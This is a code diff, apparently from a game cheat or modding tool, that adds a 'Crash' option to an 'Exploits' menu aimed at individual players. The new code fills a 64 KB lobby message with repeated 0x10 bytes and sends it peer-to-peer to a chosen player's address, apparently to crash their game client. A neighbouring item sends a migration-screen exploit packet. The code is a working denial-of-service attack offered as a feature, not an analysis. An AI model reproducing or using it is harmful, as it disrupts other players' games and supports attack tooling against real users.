@@ -268,6 +268,21 @@ namespace menu
 
 						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num)))
 						{
+							if (ImGui::MenuItem("Crash", nullptr, nullptr, is_netadr_valid))
+							{
+								char buf[0x10000] = { 0 };
+								game::msg_t msg{};
+
+								msg.init_lobby(buf, game::MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
+
+								while (msg.cursize < msg.maxsize)
+								{
+									msg.write<uint8_t>(0x10);
+								}
+
+								events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr, player_xuid);
+							}
+							
 							if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, is_netadr_valid))
 							{
 								exploit::send_mstart_packet(netadr);
